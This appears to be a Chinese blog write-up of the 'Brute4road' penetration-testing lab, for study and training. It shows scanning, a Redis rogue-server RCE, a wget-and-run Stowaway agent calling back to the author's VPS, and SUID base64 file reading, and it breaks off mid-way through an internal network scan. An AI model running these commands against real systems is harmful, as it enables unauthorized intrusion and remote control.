@@ -1,0 +1,485 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>春秋云镜-Brute4road | Hundredsu'Blog</title><meta name="author" content="Hundredsu"><meta name="copyright" content="Hundredsu"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="目标ip 信息收集 1fscan.exe -h 39.99.232.242   123456789101112131415161718192021  ______                   _____  _ |  ____|                 |  __ \| | | |__ ___  ___ __ _ _ __ | |__) | |_   _ ___ |  __&#x2F; __|">
+<meta property="og:type" content="article">
+<meta property="og:title" content="春秋云镜-Brute4road">
+<meta property="og:url" content="https://hundredsu.github.io/post/38a9b672.html">
+<meta property="og:site_name" content="Hundredsu&#39;Blog">
+<meta property="og:description" content="目标ip 信息收集 1fscan.exe -h 39.99.232.242   123456789101112131415161718192021  ______                   _____  _ |  ____|                 |  __ \| | | |__ ___  ___ __ _ _ __ | |__) | |_   _ ___ |  __&#x2F; __|">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://hundredsu.github.io/img/avatar.jpg">
+<meta property="article:published_time" content="2025-08-07T08:44:02.000Z">
+<meta property="article:modified_time" content="2025-08-07T17:49:10.073Z">
+<meta property="article:author" content="Hundredsu">
+<meta property="article:tag" content="靶机渗透">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://hundredsu.github.io/img/avatar.jpg"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "春秋云镜-Brute4road",
+  "url": "https://hundredsu.github.io/post/38a9b672.html",
+  "image": "https://hundredsu.github.io/img/avatar.jpg",
+  "datePublished": "2025-08-07T08:44:02.000Z",
+  "dateModified": "2025-08-07T17:49:10.073Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Hundredsu",
+      "url": "https://hundredsu.github.io/"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/avatar.jpg"><link rel="canonical" href="https://hundredsu.github.io/post/38a9b672.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.3.4"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.7.2/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '春秋云镜-Brute4road',
+  isHighlightShrink: false,
+  isToc: false,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">27</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">8</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/avatar.jpg" alt="Logo"><span class="site-name">Hundredsu'Blog</span></a><a class="nav-page-title" href="/"><span class="site-name">春秋云镜-Brute4road</span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">春秋云镜-Brute4road</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-08-07T08:44:02.000Z" title="发表于 2025-08-07 16:44:02">2025-08-07</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-08-07T17:49:10.073Z" title="更新于 2025-08-08 01:49:10">2025-08-08</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><p>目标ip</p>
+<p>信息收集</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fscan.exe -h 39.99.232.242</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4road/1.png"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">  ______                   _____  _</span><br><span class="line"> |  ____|                 |  __ \| |</span><br><span class="line"> | |__ ___  ___ __ _ _ __ | |__) | |_   _ ___</span><br><span class="line"> |  __/ __|/ __/ _  |  _ \|  ___/| | | | / __|</span><br><span class="line"> | |  \__ \ (_| (_| | | | | |    | | |_| \__ \</span><br><span class="line"> |_|  |___/\___\__,_|_| |_|_|    |_|\__,_|___/</span><br><span class="line">                     fscan version: 1.8.4 TeamdArk5 v1.0</span><br><span class="line">start infoscan</span><br><span class="line">39.99.232.242:6379 open</span><br><span class="line">39.99.232.242:21 open</span><br><span class="line">39.99.232.242:22 open</span><br><span class="line">39.99.232.242:80 open</span><br><span class="line">[*] alive ports len is: 4</span><br><span class="line">start vulscan</span><br><span class="line">[*] WebTitle http://39.99.232.242      code:200 len:4833   title:Welcome to CentOS</span><br><span class="line">[+] ftp 39.99.232.242:21:anonymous</span><br><span class="line">   [-&gt;]pub</span><br><span class="line">[+] Redis 39.99.232.242:6379 unauthorized file:/usr/local/redis/db/dump.rdb</span><br><span class="line">已完成 4/4</span><br><span class="line">[*] 扫描结束,耗时: 44.9886764s</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4road/2.png"></p>
+<p>增强版mdut直接连接</p>
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4road/3.png"></p>
+<p>显示可以使用主从复制rce</p>
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4road/4.png"></p>
+<p>使用这里报错</p>
+<p>那么用脚本试试吧</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python3 redis-rogue-server.py --rhost 39.99.232.242 --lhost 47.113.229.136 </span><br><span class="line"></span><br><span class="line"><span class="comment">#重置了n次</span></span><br><span class="line">python3 redis-rogue-server.py --rhost 39.99.157.234 --lhost 47.113.229.136 </span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4road/5.png"></p>
+<p>在vps直接运行</p>
+<p>可以获取一个交互式的shell</p>
+<p>但是这里不太好看，那么我先传stow</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#vps</span></span><br><span class="line">./linux_x64_admin -l 1122</span><br><span class="line"></span><br><span class="line"><span class="comment">#靶机</span></span><br><span class="line">wget http://47.113.229.136:8080/stowaway_linux/linux_x64_agent</span><br><span class="line"></span><br><span class="line"><span class="built_in">chmod</span> +x linux_x64_agent</span><br><span class="line"></span><br><span class="line">./linux_x64_agent -c 47.113.229.136:1122</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4road/6.png"></p>
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4road/7.png"></p>
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4road/8.png"></p>
+<p>这样就是连接成功了，搭建socks隧道，打开proxifier就可以了</p>
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4road/9.png"></p>
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4road/10.png"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/proxychains4.conf</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这里也可以拿个更好看的伪交互式shell</p>
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4road/11.png"></p>
+<p>没有权限，接下来就提权吧</p>
+<p>前面看见是linux</p>
+<p>就不打内核了，先看看sudo suid，配置利用，应用服务</p>
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4road/12.png"></p>
+<p>先看看suid吧</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">/usr/sbin/pam_timestamp_check</span><br><span class="line">/usr/sbin/usernetctl</span><br><span class="line">/usr/sbin/unix_chkpwd</span><br><span class="line">/usr/bin/at</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/chage</span><br><span class="line">/usr/bin/base64</span><br><span class="line">/usr/bin/umount</span><br><span class="line">/usr/bin/su</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/bin/crontab</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/mount</span><br><span class="line">/usr/bin/pkexec</span><br><span class="line">/usr/libexec/dbus-1/dbus-daemon-launch-helper</span><br><span class="line">/usr/lib/polkit-1/polkit-agent-helper-1</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>就直接利用base64吧</p>
+<p>不知道可以直接拿这些问ai</p>
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4road/13.png"></p>
+<p>不能直接提权，但是可以读文件</p>
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4road/14.png"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">base64</span> <span class="string">&quot;/home/redis/flag/flag01&quot;</span> | <span class="built_in">base64</span> --decode</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4road/15.png"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[redis@centos-web01 db]$ <span class="built_in">base64</span> <span class="string">&quot;/home/redis/flag/flag01&quot;</span> | <span class="built_in">base64</span> --decode</span><br><span class="line"><span class="built_in">base64</span> <span class="string">&quot;/home/redis/flag/flag01&quot;</span> | <span class="built_in">base64</span> --decode</span><br><span class="line"> ??????                    ??              ??  ???????                           ??</span><br><span class="line">????????                  ???             ??? ?????????                         ???</span><br><span class="line">??   ???  ?????? ??   ?? ??????  ?????   ? ?? ???   ???   ??????   ??????       ???</span><br><span class="line">???????  ??????????  ?????????  ??????? ??????????????   ???????? ????????   ??????</span><br><span class="line">?????? ?? ??? ? ???  ???  ???  ?????????????? ????????  ???   ???  ???????  ???????</span><br><span class="line">??    ??? ???   ???  ???  ???  ???????     ?? ???  ???? ???   ??? ???????? ???  ???</span><br><span class="line">???????? ????   ????????  ???? ????????    ?? ???   ???????????? ??????????????????</span><br><span class="line">???????  ???     ??????    ??   ??????     ?  ??     ??  ??????   ????????  ?????? </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag01: flag&#123;66dd3387-14bc-4c73-8132-28ed3237ed6b&#125;</span><br><span class="line"></span><br><span class="line">Congratulations! ! !</span><br><span class="line">Guess <span class="built_in">where</span> is the second flag?</span><br></pre></td></tr></table></figure>
+
+
+
+<p>继续信息收集</p>
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4road/16.png"></p>
+<p>传fscan</p>
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4road/17.png"></p>
+<p>可以看到内网ip为172.22.2.7</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chmod</span> +x ./fscan</span><br><span class="line">./fscan -h 172.22.2.0/24</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line">[2025-04-16 15:23:22] [INFO] 暴力破解线程数: 1</span><br><span class="line">[2025-04-16 15:23:22] [INFO] 开始信息扫描</span><br><span class="line">[2025-04-16 15:23:22] [INFO] CIDR范围: 172.22.2.0-172.22.2.255</span><br><span class="line">[2025-04-16 15:23:22] [INFO] 生成IP范围: 172.22.2.0.%!d(string=172.22.2.255) - %!s(MISSING).%!d(MISSING)</span><br><span class="line">[2025-04-16 15:23:22] [INFO] 解析CIDR 172.22.2.0/24 -&gt; IP范围 172.22.2.0-172.22.2.255</span><br><span class="line">[2025-04-16 15:23:22] [INFO] 最终有效主机数量: 256</span><br><span class="line">[2025-04-16 15:23:22] [INFO] 开始主机扫描</span><br><span class="line">[2025-04-16 15:23:22] [INFO] 正在尝试无监听ICMP探测...</span><br><span class="line">[2025-04-16 15:23:22] [INFO] 当前用户权限不足,无法发送ICMP包</span><br><span class="line">[2025-04-16 15:23:22] [INFO] 切换为PING方式探测...</span><br><span class="line">[2025-04-16 15:23:22] [SUCCESS] 目标 172.22.2.3      存活 (ICMP)</span><br><span class="line">[2025-04-16 15:23:22] [SUCCESS] 目标 172.22.2.7      存活 (ICMP)</span><br><span class="line">[2025-04-16 15:23:22] [SUCCESS] 目标 172.22.2.16     存活 (ICMP)</span><br><span class="line">[2025-04-16 15:23:22] [SUCCESS] 目标 172.22.2.18     存活 (ICMP)</span><br><span class="line">[2025-04-16 15:23:22] [SUCCESS] 目标 172.22.2.34     存活 (ICMP)</span><br><span class="line">[2025-04-16 15:23:28] [INFO] 存活主机数量: 5</span><br><span class="line">[2025-04-16 15:23:28] [INFO] 有效端口数量: 233</span><br><span class="line">[2025-04-16 15:23:28] [SUCCESS] 端口开放 172.22.2.3:88</span><br><span class="line">[2025-04-16 15:23:28] [SUCCESS] 端口开放 172.22.2.7:21</span><br><span class="line">[2025-04-16 15:23:28] [SUCCESS] 端口开放 172.22.2.16:80</span><br><span class="line">[2025-04-16 15:23:28] [SUCCESS] 端口开放 172.22.2.18:80</span><br><span class="line">[2025-04-16 15:23:28] [SUCCESS] 端口开放 172.22.2.18:22</span><br><span class="line">[2025-04-16 15:23:28] [SUCCESS] 端口开放 172.22.2.7:80</span><br><span class="line">[2025-04-16 15:23:28] [SUCCESS] 端口开放 172.22.2.7:22</span><br><span class="line">[2025-04-16 15:23:28] [SUCCESS] 端口开放 172.22.2.3:135</span><br><span class="line">[2025-04-16 15:23:28] [SUCCESS] 端口开放 172.22.2.34:445</span><br><span class="line">[2025-04-16 15:23:28] [SUCCESS] 端口开放 172.22.2.18:445</span><br><span class="line">[2025-04-16 15:23:28] [SUCCESS] 端口开放 172.22.2.16:445</span><br><span class="line">[2025-04-16 15:23:28] [SUCCESS] 端口开放 172.22.2.3:445</span><br><span class="line">[2025-04-16 15:23:28] [SUCCESS] 端口开放 172.22.2.3:389</span><br><span class="line">[2025-04-16 15:23:28] [SUCCESS] 端口开放 172.22.2.34:139</span><br><span class="line">[2025-04-16 15:23:28] [SUCCESS] 端口开放 172.22.2.18:139</span><br><span class="line">[2025-04-16 15:23:28] [SUCCESS] 端口开放 172.22.2.16:139</span><br><span class="line">[2025-04-16 15:23:28] [SUCCESS] 端口开放 172.22.2.3:139</span><br><span class="line">[2025-04-16 15:23:28] [SUCCESS] 端口开放 172.22.2.34:135</span><br><span class="line">[2025-04-16 15:23:28] [SUCCESS] 端口开放 172.22.2.16:135</span><br><span class="line">[2025-04-16 15:23:28] [SUCCESS] 端口开放 172.22.2.16:1433</span><br><span class="line">[2025-04-16 15:23:28] [SUCCESS] 端口开放 172.22.2.7:6379</span><br><span class="line">[2025-04-16 15:23:28] [SUCCESS] 服务识别 172.22.2.7:21 =&gt; [ftp] 版本:3.0.2 产品:vsftpd 系统:Unix Banner:[220 (vsFTPd 3.0.2).]</span><br><span class="line">[2025-04-16 15:23:28] [SUCCESS] 服务识别 172.22.2.18:22 =&gt; [ssh] 版本:8.2p1 Ubuntu 4ubuntu0.5 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5.]</span><br><span class="line">[2025-04-16 15:23:29] [SUCCESS] 服务识别 172.22.2.7:22 =&gt; [ssh] 版本:7.4 产品:OpenSSH 信息:protocol 2.0 Banner:[SSH-2.0-OpenSSH_7.4.]</span><br><span class="line">[2025-04-16 15:23:33] [SUCCESS] 服务识别 172.22.2.3:88 =&gt; </span><br><span class="line">[2025-04-16 15:23:33] [SUCCESS] 服务识别 172.22.2.16:80 =&gt; [http] 版本:2.0 产品:Microsoft HTTPAPI httpd 系统:Windows</span><br><span class="line">[2025-04-16 15:23:34] [SUCCESS] 服务识别 172.22.2.7:80 =&gt; [http] 版本:1.20.1 产品:nginx</span><br><span class="line">[2025-04-16 15:23:34] [SUCCESS] 服务识别 172.22.2.34:445 =&gt; </span><br><span class="line">[2025-04-16 15:23:34] [SUCCESS] 服务识别 172.22.2.16:445 =&gt; </span><br><span class="line">[2025-04-16 15:23:34] [SUCCESS] 服务识别 172.22.2.3:445 =&gt; </span><br><span class="line">[2025-04-16 15:23:34] [SUCCESS] 服务识别 172.22.2.3:389 =&gt; [ldap] 产品:Microsoft Windows Active Directory LDAP 系统:Windows 信息:Domain: xiaorang.lab, Site: Default-First-Site-Name</span><br><span class="line">[2025-04-16 15:23:34] [SUCCESS] 服务识别 172.22.2.34:139 =&gt;  Banner:[.]</span><br><span class="line">[2025-04-16 15:23:34] [SUCCESS] 服务识别 172.22.2.16:139 =&gt;  Banner:[.]</span><br><span class="line">[2025-04-16 15:23:34] [SUCCESS] 服务识别 172.22.2.3:139 =&gt;  Banner:[.]</span><br><span class="line">[2025-04-16 15:23:34] [SUCCESS] 服务识别 172.22.2.16:1433 =&gt; [ms-sql-s] 版本:13.00.4001; SP1 产品:Microsoft SQL Server 2016 系统:Windows Banner:[.%.]</span><br><span class="line">[2025-04-16 15:23:36] [SUCCESS] 服务识别 172.22.2.18:80 =&gt; [http]</span><br><span class="line">[2025-04-16 15:24:29] [SUCCESS] 服务识别 172.22.2.18:445 =&gt; </span><br><span class="line">[2025-04-16 15:24:29] [SUCCESS] 服务识别 172.22.2.18:139 =&gt; </span><br><span class="line">[2025-04-16 15:24:29] [SUCCESS] 服务识别 172.22.2.7:6379 =&gt; </span><br><span class="line">[2025-04-16 15:24:34] [SUCCESS] 服务识别 172.22.2.3:135 =&gt; </span><br><span class="line">[2025-04-16 15:24:34] [SUCCESS] 服务识别 172.22.2.34:135 =&gt; </span><br><span class="line">[2025-04-16 15:24:34] [SUCCESS] 服务识别 172.22.2.16:135 =&gt; </span><br><span class="line">[2025-04-16 15:24:34] [INFO] 存活端口数量: 21</span><br><span class="line">[2025-04-16 15:24:34] [INFO] 开始漏洞扫描</span><br><span class="line">[2025-04-16 15:24:34] [INFO] 加载的插件: findnet, ftp, ldap, ms17010, mssql, netbios, redis, smb, smb2, smbghost, ssh, webpoc, webtitle</span><br><span class="line">[2025-04-16 15:24:34] [SUCCESS] NetInfo 扫描结果</span><br><span class="line">目标主机: 172.22.2.16</span><br><span class="line">主机名: MSSQLSERVER</span><br><span class="line">发现的网络接口:</span><br><span class="line">   IPv4地址:</span><br><span class="line">      └─ 172.22.2.16</span><br><span class="line">[2025-04-16 15:24:34] [SUCCESS] 网站标题 http://172.22.2.16        状态码:404 长度:315    标题:Not Found</span><br><span class="line">[2025-04-16 15:24:34] [SUCCESS] NetInfo 扫描结果</span><br><span class="line">目标主机: 172.22.2.3</span><br><span class="line">主机名: DC</span><br><span class="line">发现的网络接口:</span><br><span class="line">   IPv4地址:</span><br><span class="line">      └─ 172.22.2.3</span><br><span class="line">[2025-04-16 15:24:34] [SUCCESS] NetInfo 扫描结果</span><br><span class="line">目标主机: 172.22.2.34</span><br><span class="line">主机名: CLIENT01</span><br><span class="line">发现的网络接口:</span><br><span class="line">   IPv4地址:</span><br><span class="line">      └─ 